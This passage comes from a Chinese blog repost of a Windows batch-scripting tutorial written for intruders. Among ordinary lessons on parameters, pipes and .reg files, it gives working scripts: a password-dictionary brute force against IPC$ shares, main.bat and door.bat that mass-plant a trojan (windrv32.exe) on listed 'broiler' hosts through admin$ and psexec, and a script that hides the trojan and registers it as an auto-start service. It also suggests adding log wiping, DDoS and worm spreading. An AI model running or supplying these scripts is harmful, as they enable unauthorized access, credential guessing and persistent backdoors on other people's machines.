+for /f i%% in (dict.txt) do net use </span> <a> <span style="color: #000000; font-family: 宋体;">//ip/ipc$</span> </a> <span style="font-family: 宋体;"> "i%%" /u:"administrator"│find ":</span> </span> <span style="font-family: 宋体;">命令成功完成<span lang="EN-US">"&gt;&gt;D:/ok.txt </span>，这样就<span lang="EN-US">ko</span>了。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">sample3</span> <span style="font-size: 9pt;">：</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">你有没有过手里有大量肉鸡等着你去种后门＋木马呢？，当数量特别多的时候，原本很开心的一件事都会变得很郁闷：）。文章开头就谈到使用批处理文件，可以简化<a style="color: #0000ff; background-color: transparent; text-decoration: underline;">日常</a>或重复性任务。那么如何实现呢？呵呵，看下去你就会明白了。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">主要命令也只有一条：（在批处理文件中使用<span lang="EN-US"> FOR </span>命令时，指定变量使用<span lang="EN-US"> %%variable</span>）</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call door.bat %%i %%j %%k<br>
+tokens</span>的用法请参见上面的<span lang="EN-US">sample1</span>，在这里它表示按顺序将<span lang="EN-US">victim.txt</span>中的内容传递给<span lang="EN-US">door.bat</span>中的参数<span lang="EN-US">%i %j %k</span>。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>而<span lang="EN-US">cultivate.bat</span>无非就是用<span lang="EN-US">net use</span>命令来建立<span lang="EN-US">IPC$</span>连接，并<span lang="EN-US">copy</span>木马＋后门到<span lang="EN-US">victim</span>，然后用返回码（<span lang="EN-US">If errorlever =</span>）来筛选成功种植后门的主机，并<span lang="EN-US">echo</span>出来，或者<span lang="EN-US">echo</span>到指定的文件。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+delims= </span>表示<span lang="EN-US">vivtim.txt</span>中的内容是一空格来分隔的。我想看到这里你也一定明白这<span lang="EN-US">victim.txt</span>里的内容是什么样的了。应该根据<span lang="EN-US">%%i %%j %%k</span>表示的对象来排列，一般就是<span lang="EN-US"> ip password username</span>。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>代码雏形：</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+--------------- cut here then save as a batchfile(I call <a style="color: #0000ff; background-color: transparent; text-decoration: underline;">it</a> main.bat ) ---------------------------<br>
+@echo off<br>
+@if "%1"=="" goto usage<br>
+@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call IPChack.bat %%i %%j %%k<br>
+@goto end<br>
+:usage<br>
+@echo run this batch in dos modle.or just double-click it.<br>
+:end<br>
+--------------- cut here then save as a batchfile(I call it main.bat ) --------------------------- </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">------------------- cut here then save as a batchfile(I call it door.bat) -----------------------------<br>
+@net use </span> <a> <span style="color: #000000; font-family: 宋体;">//%1/ipc$</span> </a> <span style="font-family: 宋体;"> %3 /u:"%2"<br>
+@if errorlevel 1 goto failed<br>
+@echo Trying to establish the IPC$ connection ............OK<br>
+@copy windrv32.exe//%1/admin$/system32 &amp;&amp; if not errorlevel 1 echo IP %1 USER %2 PWD %3 &gt;&gt;ko.txt<br>
+@p*** <a style="color: #0000ff; background-color: transparent; text-decoration: underline;">ec</a></span> <a> <span style="color: #000000; font-family: 宋体;">//%1</span> </a> <span style="font-family: 宋体;"> c:/winnt/system32/windrv32.exe<br>
+@p*** ec </span> <a> <span style="color: #000000; font-family: 宋体;">//%1</span> </a> <span style="font-family: 宋体;"> net start windrv32 &amp;&amp; if not errorlevel 1 echo %1 Backdoored &gt;&gt;ko.txt<br>
+:failed<br>
+@echo Sorry can not connected to the victim.<br>
+----------------- cut here then save as a batchfile(I call it door.bat) --------------------------------<br>
+</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">这只是一个自动种植后门批处理的雏形，两个批处理和后门程序（<span lang="EN-US">Windrv32.exe</span>）<span lang="EN-US">,PSexec.exe</span>需放在统一目录下<span lang="EN-US">.</span>批处理内容</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>尚可扩展<span lang="EN-US">,</span>例如<span lang="EN-US">:</span>加入清除日志<span lang="EN-US">+DDOS</span>的功能<span lang="EN-US">,</span>加入定时添加用户的功能<span lang="EN-US">,</span>更深入一点可以使之具备自动传播功能<span lang="EN-US">(</span>蠕虫<span lang="EN-US">).</span>此处不多做叙述<span lang="EN-US">,</span>有兴趣的朋友可自行研究<span lang="EN-US">. </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">二<span lang="EN-US">.</span>如何在批处理文件中使用参数</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>批处理中可以使用参数，一般从<span lang="EN-US">1%</span>到<span lang="EN-US"> 9%</span>这九个，当有多个参数时需要用<span lang="EN-US">shift</span>来移动，这种情况并不多见，我们就不考虑它了。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+sample1</span>：</span> <span style="font-family: 宋体;"> <span lang="EN-US">fomat.bat<br>
+@echo off<br>
+if "%1"=="a" format a:<br>
+:format<br>
+@format a:/q/u/auotset<br>
+@echo please insert another disk to driver A.<br>
+@pause<br>
+@goto fomat<br>
+</span>这个例子用于连续地格式化几张软盘，所以用的时候需在<span lang="EN-US">dos</span>窗口输入<span lang="EN-US">fomat.bat a</span>，呵呵<span lang="EN-US">,</span>好像有点画蛇添足了～</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+sample2</span>：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>当我们要建立一个<span lang="EN-US">IPC$</span>连接地时候总要输入一大串命令，弄不好就打错了，所以我们不如把一些固定命令写入一个批处理，把肉鸡地<span lang="EN-US">ip password username </span>当着参数来赋给这个批处理，这样就不用每次都打命令了。</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+@echo off<br>
+@net use </span> <a> <span style="color: #000000; font-family: 宋体;">//1%/ipc$</span> </a> <span style="font-family: 宋体;"> "2%" /u:"3%" </span> </span> <span style="font-family: 宋体;">注意哦，这里<span lang="EN-US">PASSWORD</span>是第二个参数。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+@if errorlevel 1 echo connection failed<br>
+</span>怎么样<span lang="EN-US">,</span>使用参数还是比较简单的吧？你这么帅一定学会了</span> <span style="font-family: 宋体;"> <span lang="EN-US">.No.3<br>
+</span>三<span lang="EN-US">.</span>如何使用组合命令<span lang="EN-US">(Compound Command) </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">1.&amp; </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">Usage</span> <span style="font-size: 9pt;">：第一条命令<span lang="EN-US"> &amp; </span>第二条命令<span lang="EN-US"> [&amp; </span>第三条命令<span lang="EN-US">...] </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">用这种方法可以同时执行多条命令，而不管命令是否执行成功</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Sample</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">：</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+C:/&gt;dir z: &amp; dir c:/Ex4rch<br>
+The system cannot find the path specified.<br>
+Volume in drive C has no label.<br>
+Volume Serial Number is 0078-59FB </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Directory of c:/Ex4rch </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">2002-05-14 23:51 .<br>
+2002-05-14 23:51 ..<br>
+2002-05-14 23:51 14 sometips.gif </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">2.&amp;&amp; </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">Usage</span> <span style="font-size: 9pt;">：第一条命令<span lang="EN-US"> &amp;&amp; </span>第二条命令<span lang="EN-US"> [&amp;&amp; </span>第三条命令<span lang="EN-US">...] </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">用这种方法可以同时执行多条命令，当碰到执行出错的命令后将不执行后面的命令，如果一直没有出错则一直执行完所有命令；</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Sample</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">：</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+C:/&gt;dir z: &amp;&amp; dir c:/Ex4rch<br>
+The system cannot find the path specified. </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">C:/&gt;dir c:/Ex4rch &amp;&amp; dir z:<br>
+Volume in drive C has no label.<br>
+Volume Serial Number is 0078-59FB </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Directory of c:/Ex4rch </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">2002-05-14 23:55 .<br>
+2002-05-14 23:55 ..<br>
+2002-05-14 23:55 14 sometips.gif<br>
+1 File(s) 14 bytes<br>
+2 Dir(s) 768,671,744 bytes free<br>
+The system cannot find the path specified. </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">在做备份的时候可能会用到这种命令会比较简单，如：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+dir file&amp;://192.168.0.1/database/backup.mdb &amp;&amp; copy file&amp;://192.168.0.1/database/backup.mdb E:/backup<br>
+</span>如果远程服务器上存在<span lang="EN-US">backup.mdb</span>文件，就执行<span lang="EN-US">copy</span>命令，若不存在该文件则不执行<span lang="EN-US">copy</span>命令。这种用法可以替换<span lang="EN-US">IF exist</span>了 ：）</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">3.││ </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">Usage</span> <span style="font-size: 9pt;">：第一条命令<span lang="EN-US"> ││ </span>第二条命令<span lang="EN-US"> [││ </span>第三条命令<span lang="EN-US">...] </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">用这种方法可以同时执行多条命令，当碰到执行正确的命令后将不执行后面的命令，如果没有出现正确的命令则一直执行完所有命令；</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Sample</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">：</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+C:/Ex4rch&gt;dir sometips.gif ││ del sometips.gif<br>
+Volume in drive C has no label.<br>
+Volume Serial Number is 0078-59FB </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Directory of C:/Ex4rch </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">2002-05-14 23:55 14 sometips.gif<br>
+1 File(s) 14 bytes<br>
+0 Dir(s) 768,696,320 bytes free </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">组合命令使用的例子：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+sample</span>：</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+@copy trojan.exe </span> <a> <span style="color: #000000; font-family: 宋体;">//%1/admin$/system32</span> </a> <span style="font-family: 宋体;"> &amp;&amp; if not errorlevel 1 echo IP %1 USER %2 PASS %3 &gt;&gt;victim.txt </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">四、管道命令的使用</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">1.│ </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+Usage</span>：第一条命令<span lang="EN-US"> │ </span>第二条命令<span lang="EN-US"> [│ </span>第三条命令</span> <span style="font-family: 宋体;"> <span lang="EN-US">...]<br>
+</span>将第一条命令的结果作为第二条命令的参数来使用，记得在<span lang="EN-US">unix</span>中这种方式很常见。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">sample</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+time /t&gt;&gt;D:/IP.log<br>
+netstat -n -p tcp│find ":3389"&gt;&gt;D:/IP.log<br>
+start Explorer<br>
+</span>看出来了么？用于终端服务允许我们为用户自定义起始的程序，来实现让用户运行下面这个<span lang="EN-US">bat</span>，以获得登录用户的<span lang="EN-US">IP</span>。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">2.&gt;</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">、<span lang="EN-US">&gt;&gt;</span>输出重定向命令</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>将一条命令或某个程序输出结果的重定向到特定文件中<span lang="EN-US">, &gt; </span>与<span lang="EN-US"> &gt;&gt;</span>的区别在于，<span lang="EN-US">&gt;</span>会清除调原有文件中的内容后写入指定文件，而<span lang="EN-US">&gt;&gt;</span>只会追加内容到指定文件中，而不会改动其中的内容。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">sample1</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">：</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+echo hello world&gt;c:/hello.txt (stupid example?) </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">sample2:<br>
+</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">时下<span lang="EN-US">DLL</span>木马盛行，我们知道<span lang="EN-US">system32</span>是个捉迷藏的好地方，许多木马都削尖了脑袋往那里钻，<span lang="EN-US">DLL</span>马也不例外，针对这一点我们可以在安装好系统和必要的应用程序后，对该目录下的<span lang="EN-US">EXE</span>和<span lang="EN-US">DLL</span>文件作一个记录：</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>运行<span lang="EN-US">CMD--</span>转换目录到</span> <span style="font-family: 宋体;"> <span lang="EN-US">system32--dir *.exe&gt;exeback.txt &amp; dir *.dll&gt;dllback.txt,<br>
+</span>这样所有的<span lang="EN-US">EXE</span>和<span lang="EN-US">DLL</span>文件的名称都被分别记录到<span lang="EN-US">exeback.txt</span>和<span lang="EN-US">dllback.txt</span>中</span> <span style="font-family: 宋体;"> <span lang="EN-US">,<br>
+</span>日后如发现异常但用传统的方法查不出问题时<span lang="EN-US">,</span>则要考虑是不是系统中已经潜入<span lang="EN-US">DLL</span>木马了</span> <span style="font-family: 宋体;"> <span lang="EN-US">.<br>
+</span>这时我们用同样的命令将<span lang="EN-US">system32</span>下的<span lang="EN-US">EXE</span>和<span lang="EN-US">DLL</span>文件记录到另外的<span lang="EN-US">exeback1.txt</span>和<span lang="EN-US">dllback1.txt</span>中<span lang="EN-US">,</span>然后运行</span> <span style="font-family: 宋体;"> <span lang="EN-US">:<br>
+CMD--fc exeback.txt exeback1.txt&gt;diff.txt &amp; fc dllback.txt dllback1.txt&gt;diff.txt.(</span>用<span lang="EN-US">FC</span>命令比较前后两次的<span lang="EN-US">DLL</span>和<span lang="EN-US">EXE</span>文件<span lang="EN-US">,</span>并将结果输入到<span lang="EN-US">diff.txt</span>中<span lang="EN-US">),</span>这样我们就能发现一些多出来的<span lang="EN-US">DLL</span>和<span lang="EN-US">EXE</span>文件<span lang="EN-US">,</span>然后通过查看创建时间、版本、是否经过压缩等就能够比较容易地判断出是不是已经被<span lang="EN-US">DLL</span>木马光顾了。没有是最好，如果有的话也不要直接<span lang="EN-US">DEL</span>掉，先用<span lang="EN-US">regsvr32 /u trojan.dll</span>将后门<span lang="EN-US">DLL</span>文件注销掉<span lang="EN-US">,</span>再把它移到回收站里，若系统没有异常反映再将之彻底删除或者提交给杀毒<a style="color: #0000ff; background-color: transparent; text-decoration: underline;">软件</a>公司。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">3.&lt; </span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">、<span lang="EN-US">&gt;&amp; </span>、</span> <span style="font-family: 宋体;"> <span lang="EN-US">&lt;&amp;<br>
+&lt; </span>从文件中而不是从键盘中读入命令输入。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+&gt;&amp; </span>将一个句柄的输出写入到另一个句柄的输入中。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+&lt;&amp; </span>从一个句柄读取输入并将其写入到另一个句柄输出中。</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>这些并不常用，也就不多做介绍。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-family: 宋体;"> <span style="font-size: 9pt;" lang="EN-US">No.5<br>
+</span> <span style="font-size: 9pt;">五<span lang="EN-US">.</span>如何用批处理文件来操作注册表</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">在入侵过程中经常回操作注册表的特定的键值来实现一定的目的，例如<span lang="EN-US">:</span>为了达到隐藏后门、木马程序而删除<span lang="EN-US">Run</span>下残余的键值。或者创建一个服务用以加载后门。当然我们也会修改注册表来加固系统或者改变系统的某个属性，这些都需要我们对注册表操作有一定的了解。下面我们就先学习一下如何使用<span lang="EN-US">.REG</span>文件来操作注册表<span lang="EN-US">.(</span>我们可以用批处理来生成一个<span lang="EN-US">REG</span>文件</span> <span style="font-family: 宋体;"> <span lang="EN-US">)<br>
+</span>关于注册表的操作，常见的是创建、修改、删除。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">1.</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">创建</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>创建分为两种，一种是创建子项<span lang="EN-US">(Subkey) </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">我们创建一个文件，内容如下：</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Windows Registry Editor Version 5.00 </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">[HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/hacker] </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">然后执行该脚本，你就已经在<span lang="EN-US">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft</span>下创建了一个名字为<span lang="EN-US">"hacker"</span>的子项。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">另一种是创建一个项目名称</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>那这种文件格式就是典型的文件格式，和你从注册表中导出的文件格式一致，内容如下：</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Windows Registry Editor Version 5.00 </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">[HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run]<br>
+"Invader"="Ex4rch"<br>
+"Door"=C://WINNT//system32//door.exe<br>
+"Autodos"=dword:02 </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">这样就在<span lang="EN-US">[HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run]</span>下</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>新建了<span lang="EN-US">:Invader</span>、<span lang="EN-US">door</span>、<span lang="EN-US">about</span>这三个项目</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+Invader</span>的类型是</span> <span style="font-family: 宋体;"> <span lang="EN-US">"String value"<br>
+door</span>的类型是</span> <span style="font-family: 宋体;"> <span lang="EN-US">"REG SZ value"<br>
+Autodos</span>的类型是<span lang="EN-US">"DWORD value" </span></span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">2.</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">修改</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>修改相对来说比较简单，只要把你需要修改的项目导出，然后用记事本进行修改，然后导入（<span lang="EN-US">regedit /s</span>）即可。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">3.</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">删除</span> <span style="font-family: 宋体;"> <span lang="EN-US"><br>
+</span>我们首先来说说删除一个项目名称，我们创建一个如下的文件：</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Windows Registry Editor Version 5.00 </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">[HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run]<br>
+"Ex4rch"=- </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">执行该脚本，<span lang="EN-US">[HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run]</span>下的<span lang="EN-US">"Ex4rch"</span>就被删除了；</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">我们再看看删除一个子项，我们创建一个如下的脚本：</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">Windows Registry Editor Version 5.00 </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">[-HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run] </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">执行该脚本，<span lang="EN-US">[HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run]</span>就已经被删除了。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;"> <span style="font-family: 宋体;">相信看到这里，<span lang="EN-US">.reg</span>文件你基本已经掌握了。那么现在的目标就是用批处理来创建特定内容的<span lang="EN-US">.reg</span>文件了，记得我们前面说道的利用重定向符号可以很容易地创建特定类型的文件。</span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">samlpe1:</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">如上面的那个例子<span lang="EN-US">,</span>如想生成如下注册表文件</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+Windows Registry Editor Version 5.00 </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">[HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run]<br>
+"Invader"="Ex4rch"<br>
+"door"=hex:255<br>
+"Autodos"=dword:000000128<br>
+</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">只需要这样：</span> <span lang="EN-US"> <span style="font-family: 宋体;"><br>
+@echo Windows Registry Editor Version 5.00&gt;&gt;Sample.reg </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">@echo [HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run]&gt;Sample.reg<br>
+@echo "Invader"="Ex4rch"&gt;&gt;Sample.reg<br>
+@echo "door"=5&gt;&gt;C://WINNT//system32//door.exe&gt;&gt;Sample.reg<br>
+@echo "Autodos"=dword:02&gt;&gt;Sample.reg </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">samlpe2:<br>
+</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">我们现在在使用一些比较老的木马时<span lang="EN-US">,</span>可能会在注册表的<span lang="EN-US">[HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run(Runonce</span>、<span lang="EN-US">Runservices</span>、<span lang="EN-US">Runexec)]</span>下生成一个键值用来实现木马的自启动<span lang="EN-US">.</span>但是这样很容易暴露木马程序的路径<span lang="EN-US">,</span>从而导致木马被查杀<span lang="EN-US">,</span>相对地若是将木马程序注册为系统服务则相对安全一些<span lang="EN-US">.</span>下面以配置好地<span lang="EN-US">IRC</span>木马<span lang="EN-US">DSNX</span>为例<span lang="EN-US">(</span>名为</span> <span lang="EN-US"> <span style="font-family: 宋体;">windrv32.exe)<br>
+@start windrv32.exe<br>
+@attrib +h +r windrv32.exe<br>
+@echo [HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run] &gt;&gt;patch.dll<br>
+@echo "windsnx "=- &gt;&gt;patch.dll<br>
+@sc.exe create Windriversrv type= kernel start= auto displayname= WindowsDriver binpath= c:/winnt/system32/windrv32.exe<br>
+@regedit /s patch.dll<br>
+@delete patch.dll </span> </span> </span></p>
+<p> </p>
+<p style="line-height: 12.75pt;"><span style="font-size: 9pt;" lang="EN-US"> <span style="font-family: 宋体;">@REM [</span> </span> <span style="font-size: 9pt;"> <span style="font-family: 宋体;">删除<span lang="EN-US">DSNXDE</span>在注册表中的启动项，用<span lang="EN-US">sc.exe</span>将之注册为系统关键性服务的同时将其属性设为隐藏和只读，并<span lang="EN-US">config</span>为自启动</span> <span style="font-family: 宋体;"> <span lang="EN-US">]<br>
+@REM </span>这样不是更安全<span lang="EN-US">.</span></span> </span></p>
+<p> </p>
+								<div class="clear"></div>
+				<!-- Baidu inner-ad BEGIN -->
+				<div>
+					<!--ad here-->
+				</div>
+				<!-- Baidu inner-ad end -->
+			</div>
+			<div class="clear"></div>
+		</div>
+		<h3 class="pay_title">============ 欢迎各位老板打赏~ ===========</h3>
+		<div class="pay">
+			<img class="wxpay" src="/wp-content/themes/WPCnblogs/images/wxpay.png">
+			<img class="alipay" src="/wp-content/themes/WPCnblogs/images/alipay.png">
+		</div>
+		
+		<!-- end: entry -->
+		<div class="archive_tags">
+			<span class="content_tag">关键字: <a href="/tag/%E6%89%B9%E5%A4%84%E7%90%86" rel="tag">批处理</a></span>
+		</div>
+		
+		<div class="clear"></div>
+		
+		<div class="prevnextblock">
+			【上篇】<a href="/2012/03/23/excel%E5%AF%BC%E5%85%A5sql-server%E7%9A%84%E4%BE%8B%E5%AD%90-%E7%99%BE%E5%BA%A6%E7%9F%A5%E9%81%93.html" rel="prev">Excel导入SQL server的例子-百度知道</a><br>【下篇】<a href="/2012/03/24/%E6%9D%9C%E7%94%AB%E5%BE%88%E5%BF%99-%E6%B6%82%E9%B8%A6%E5%85%A8%E9%9B%86.html" rel="next">杜甫很忙 涂鸦全集</a>		</div>
+		
+		<div class="clear"></div>
+		<div class="relates">
+			<h4>与本文相关的文章</h4>
